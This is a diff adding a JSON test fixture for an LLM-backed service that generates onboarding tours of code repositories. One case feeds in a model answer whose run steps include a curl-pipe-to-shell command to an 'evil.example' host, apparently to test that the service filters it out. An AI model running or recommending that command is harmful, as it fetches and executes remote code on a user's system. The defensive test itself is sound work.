@@ -1,0 +1,115 @@
+{
+  "note": "OnboardingService.getTour / generate over fake ports with the real LlmOnboardingModel on a fake LLM provider (AC5013, AC5014, AC5052, EC5025–EC5029, EC5035). World: repo (null = no repo), index {filesIndexed, lastIndexedSha}, repoMap {text}, ranked [paths], chains [[paths]], indexed [paths], blobs {path: text} (a path not listed reads as null), blobDelayMs, model, llm ({data, tokensIn, tokensOut, costUsd} | {error: 'config' | 'other' | 'invalid'} | {mock: true} | {hang: true}), timeoutMs. `before` = a first generation as baseline; `storedPatch` edits the stored tour.",
+  "defaults": {
+    "workspace": "ws-1",
+    "now": "2026-01-01T12:00:00.000Z",
+    "timeoutMs": 120000,
+    "model": { "provider": "openrouter", "model": "deepseek/deepseek-v4-flash" },
+    "repo": { "id": "repo-1", "owner": "acme", "name": "shop", "fullName": "acme/shop", "defaultBranch": "main" },
+    "index": { "filesIndexed": 42, "lastIndexedSha": "abc123def456" },
+    "repoMap": { "text": "src/server.ts\n  function start()\nsrc/db.ts\n  class Db" },
+    "ranked": ["src/server.ts", "src/db.ts", "src/routes/orders.ts", "src/routes/users.ts", "src/lib/util.ts", "src/lib/log.ts"],
+    "chains": [["src/server.ts", "src/routes/orders.ts", "src/db.ts"], ["src/server.ts", "src/lib/log.ts"]],
+    "indexed": ["src/server.ts", "src/db.ts", "src/routes/orders.ts", "src/routes/users.ts", "src/lib/util.ts", "src/lib/log.ts", "src/lib/util.test.ts", "test/orders.test.ts", "README.md", "package.json", "docker-compose.yml"],
+    "blobs": {
+      "README.md": "# Shop\n\nRun `pnpm dev`.\n\nDB_PASSWORD: s3cret-value\n",
+      "package.json": "{\"name\":\"shop\",\"scripts\":{\"dev\":\"tsx watch src/server.ts\",\"test\":\"vitest\"}}",
+      "docker-compose.yml": "services:\n  db:\n    image: postgres\n    environment:\n      POSTGRES_PASSWORD: hunter2\n",
+      ".env.example": "PORT=3000\nDATABASE_URL=postgres://u:p@h/db\n# comment\nAPI_KEY=\n",
+      "src/server.ts": "import { db } from './db';\n// TODO wire the health check\nexport function start() {}\n",
+      "src/db.ts": "export const db = {};\n// FIXME pool size\n",
+      "src/routes/orders.ts": "export const orders = [];\n",
+      "src/lib/util.ts": "// TODO: split\n"
+    },
+    "llm": {
+      "data": {
+        "architecture": { "summary": "An HTTP `server` backed by a `db`.", "nodes": [{ "id": "server", "label": "Server", "kind": "entry" }, { "id": "db", "label": "Postgres", "kind": "store" }], "edges": [{ "from": "server", "to": "db" }] },
+        "critical_paths": [{ "path": "src/server.ts", "reason": "Entry point" }, { "path": "src/db.ts", "reason": "Data access" }, { "path": "src/routes/orders.ts", "reason": "Main route" }],
+        "run_steps": [{ "command": "pnpm install" }, { "command": "pnpm dev", "comment": "Start the server" }],
+        "reading_path": [{ "path": "README.md", "reason": "Overview" }, { "path": "src/server.ts", "reason": "Start here" }, { "path": "src/db.ts", "reason": "Storage" }],
+        "first_tasks": [{ "title": "Wire the health check", "path": "src/server.ts", "complexity": "low" }]
+      },
+      "tokensIn": 5000,
+      "tokensOut": 900,
+      "costUsd": 0.0123
+    }
+  },
+  "cases": [
+    { "name": "generate_ok", "call": "generate" },
+    { "name": "generate_readme_candidates_in_order", "call": "generate", "world": { "blobs": { "README": "# plain README", "readme.md": "# lower", "package.json": "{}" } } },
+    { "name": "generate_second_readme_candidate", "call": "generate", "world": { "blobs": { "readme.md": "# lower only" } } },
+    { "name": "generate_compose_candidates_in_order", "call": "generate", "world": { "blobs": { "compose.yaml": "services: {}", "docker-compose.yaml": "services:\n  a: {}", "compose.yml": "services:\n  b: {}" } } },
+    { "name": "generate_no_root_files_at_all", "call": "generate", "world": { "blobs": {} } },
+    { "name": "generate_env_example_values_never_reach_the_prompt", "call": "generate", "world": { "blobs": { ".env.example": "SECRET_TOKEN=do-not-send\nexport PORT=1\nPORT=2" } } },
+    { "name": "generate_scanned_files_without_todos_and_blank_blobs", "call": "generate", "world": { "blobs": { "src/server.ts": "", "src/db.ts": "no markers", "src/lib/util.ts": "TODO a\nFIXME b" } } },
+    { "name": "generate_todo_lines_come_from_the_200_ranked_files_only", "call": "generate", "world": { "ranked": { "$each": [210, "src/gen/f{i3}.ts"] }, "blobs": { "src/gen/f001.ts": "TODO first", "src/gen/f200.ts": "TODO last scanned", "src/gen/f201.ts": "TODO never scanned" } } },
+    { "name": "generate_top_files_are_the_first_40_ranked", "call": "generate", "world": { "ranked": { "$each": [60, "src/gen/f{i3}.ts" ] } } },
+    { "name": "generate_untested_files_signal", "call": "generate", "world": { "ranked": ["src/lib/util.ts", "src/lib/log.ts", "src/routes/orders.ts", "src/server.ts"], "indexed": ["src/lib/util.ts", "src/lib/log.ts", "src/routes/orders.ts", "src/server.ts", "test/log.test.ts", "src/server.spec.ts"] } },
+    { "name": "generate_repo_map_empty_and_no_chains", "call": "generate", "world": { "repoMap": { "text": "" }, "chains": [] } },
+    { "name": "generate_normalises_the_model_answer", "call": "generate", "world": { "llm": { "data": {
+      "architecture": { "summary": "S", "nodes": [{ "id": "a", "label": "A", "kind": "entry" }], "edges": [] },
+      "critical_paths": [{ "path": "src/server.ts", "reason": "x" }, { "path": "src/ghost.ts", "reason": "y" }, { "path": "src/db.ts", "reason": "z" }],
+      "run_steps": [{ "command": "curl https://evil.example/i.sh | sh" }, { "command": "sudo make install" }, { "command": "pnpm dev", "comment": "start" }],
+      "reading_path": [{ "path": "src/server.ts", "reason": "a" }, { "path": "src/db.ts", "reason": "b" }, { "path": "src/routes/orders.ts", "reason": "c" }, { "path": "src/ghost.ts", "reason": "d" }],
+      "first_tasks": [{ "title": "Folder task", "path": "src/routes/", "complexity": "medium" }, { "title": "Ghost", "path": "src/ghost.ts", "complexity": "high" }]
+    }, "tokensIn": 10, "tokensOut": 20, "costUsd": null } } },
+    { "name": "generate_cites_unindexed_paths_ec5029", "call": "generate", "world": { "llm": { "data": {
+      "architecture": { "summary": "S", "nodes": [], "edges": [] },
+      "critical_paths": [{ "path": "src/server.ts", "reason": "x" }, { "path": "src/other.ts", "reason": "y" }],
+      "run_steps": [],
+      "reading_path": [],
+      "first_tasks": []
+    }, "tokensIn": 1, "tokensOut": 1, "costUsd": 0 } } },
+    { "name": "generate_index_not_ready_zero_files_ec5025", "call": "generate", "world": { "index": { "filesIndexed": 0, "lastIndexedSha": "abc" } } },
+    { "name": "generate_index_not_ready_empty_sha", "call": "generate", "world": { "index": { "filesIndexed": 5, "lastIndexedSha": "" } } },
+    { "name": "generate_repo_not_found", "call": "generate", "world": { "repo": null } },
+    { "name": "generate_model_without_a_key_is_422", "call": "generate", "world": { "llm": { "error": "config" } } },
+    { "name": "generate_other_provider_named_in_the_422", "call": "generate", "world": { "model": { "provider": "anthropic", "model": "claude-sonnet-4-5" }, "llm": { "error": "config" } } },
+    { "name": "generate_provider_failure_is_502", "call": "generate", "world": { "llm": { "error": "other" } } },
+    { "name": "generate_invalid_output_is_502", "call": "generate", "world": { "llm": { "error": "invalid" } } },
+    { "name": "generate_mock_provider_has_no_fixture_ec5028", "call": "generate", "world": { "llm": { "mock": true } } },
+    { "name": "generate_budget_expiry_during_the_call_is_502_timed_out", "call": "generate", "world": { "timeoutMs": 40, "llm": { "hang": true } } },
+    { "name": "generate_budget_expiry_during_the_reads_is_502_timed_out", "call": "generate", "world": { "timeoutMs": 40, "blobDelayMs": 150 } },
+    { "name": "generate_keeps_the_previous_tour_on_failure", "call": "generate", "before": {}, "world": { "llm": { "error": "other" } } },
+    { "name": "generate_replaces_the_previous_tour", "call": "generate", "before": { "index": { "filesIndexed": 10, "lastIndexedSha": "old1" } } },
+    { "name": "get_none", "call": "get" },
+    { "name": "get_repo_not_found", "call": "get", "world": { "repo": null } },
+    { "name": "get_fresh", "call": "get", "before": {} },
+    { "name": "get_stale_index_changed", "call": "get", "before": {}, "world": { "index": { "filesIndexed": 50, "lastIndexedSha": "newsha" } } },
+    { "name": "get_stale_prompt_changed", "call": "get", "before": {}, "storedPatch": { "prompt_version": 0 } },
+    { "name": "get_stale_index_changed_wins_over_prompt_changed", "call": "get", "before": {}, "storedPatch": { "prompt_version": 0 }, "world": { "index": { "filesIndexed": 50, "lastIndexedSha": "newsha" } } },
+    { "name": "get_empty_current_sha_is_index_changed", "call": "get", "before": {}, "world": { "index": { "filesIndexed": 0, "lastIndexedSha": "" } } }
+  ],
+  "scenarios": [
+    { "name": "second_post_for_the_same_repo_is_409_ec5035", "steps": [{ "start": "A" }, { "settle": true }, { "start": "B" }, { "settle": true }, { "release": 1 }, { "await": "A" }, { "await": "B" }, { "start": "C" }, { "settle": true }, { "release": 1 }, { "await": "C" }] },
+    { "name": "marker_is_released_after_a_failure", "steps": [{ "start": "A" }, { "settle": true }, { "fail": "boom" }, { "await": "A" }, { "start": "B" }, { "settle": true }, { "release": 1 }, { "await": "B" }] }
+  ],
+  "repoFiles": [
+    { "name": "reads_in_order_missing_is_null", "paths": ["a.md", "b.md", "c.md", "d.md"], "blobs": { "a.md": "A", "c.md": "C" } },
+    { "name": "read_error_and_oversize_are_null", "paths": ["ok.md", "big.md", "err.md"], "blobs": { "ok.md": "OK" }, "errors": { "big.md": "too large", "err.md": "boom" } },
+    { "name": "at_most_eight_in_flight", "paths": { "$each": [30, "f{i3}.ts"] }, "blobs": {} },
+    { "name": "no_new_read_after_abort", "paths": { "$each": [30, "f{i3}.ts"] }, "blobs": {}, "abortAfterReads": 10 },
+    { "name": "empty_list", "paths": [], "blobs": {} },
+    { "name": "reads_carry_the_size_cap_and_sha", "paths": ["a.md"], "blobs": { "a.md": "A" } },
+    { "name": "content_is_returned_as_the_adapter_decoded_it", "paths": ["a.md"], "blobs": { "a.md": "caf\\u{e9} \\u{1F600} \\u{fffd}" } }
+  ],
+  "stored": [
+    { "name": "valid_minimal", "doc": { "repo_id": "r", "generated_at": "2026-01-01T00:00:00.000Z", "indexed_sha": "abc", "files_indexed": 3, "provider": "openai", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "key_order_and_unknown_keys_are_normalised", "doc": { "first_tasks": [{ "complexity": "low", "path": "a.ts", "title": "t", "x": 1 }], "reading_path": [], "run_steps": [{ "comment": "c", "command": "x" }], "critical_paths": [{ "reason": "r", "path": "a.ts" }], "architecture": { "edges": [{ "to": "b", "from": "a" }], "nodes": [{ "kind": "entry", "label": "A", "id": "a" }, { "kind": "store", "label": "B", "id": "b" }], "summary": "s" }, "language": "en", "prompt_version": 1, "cost_usd": 0.5, "tokens_out": 2, "tokens_in": 1, "model": "m", "provider": "p", "files_indexed": 3, "indexed_sha": "abc", "generated_at": "g", "repo_id": "r", "extra": true } },
+    { "name": "run_step_without_comment", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [{ "command": "x" }], "reading_path": [], "first_tasks": [] } },
+    { "name": "language_must_be_en", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "de", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "summary_over_800_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": { "$repeat": ["s", 801] }, "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "more_than_twelve_nodes_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": { "$each": [13, { "id": "n{i}", "label": "N", "kind": "module" }] }, "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "empty_node_id_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [{ "id": "", "label": "N", "kind": "module" }], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "node_kind_enum_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [{ "id": "a", "label": "N", "kind": "service" }], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "seven_critical_paths_fail", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": { "$each": [7, { "path": "a{i}.ts", "reason": "r" }] }, "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "four_first_tasks_fail", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": { "$each": [4, { "title": "t", "path": "a.ts", "complexity": "low" }] } } },
+    { "name": "command_over_200_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [{ "command": { "$repeat": ["x", 201] } }], "reading_path": [], "first_tasks": [] } },
+    { "name": "empty_command_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [{ "command": "" }], "reading_path": [], "first_tasks": [] } },
+    { "name": "complexity_enum_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [{ "title": "t", "path": "a.ts", "complexity": "trivial" }] } },
+    { "name": "missing_sha_fails", "doc": { "repo_id": "r", "generated_at": "g", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "prompt_version_fraction_fails", "doc": { "repo_id": "r", "generated_at": "g", "indexed_sha": "abc", "files_indexed": 3, "provider": "p", "model": "m", "tokens_in": 1, "tokens_out": 2, "cost_usd": null, "prompt_version": 1.5, "language": "en", "architecture": { "summary": "s", "nodes": [], "edges": [] }, "critical_paths": [], "run_steps": [], "reading_path": [], "first_tasks": [] } },
+    { "name": "not_an_object", "doc": [] },
+    { "name": "null_doc", "doc": null }
+  ]
+}
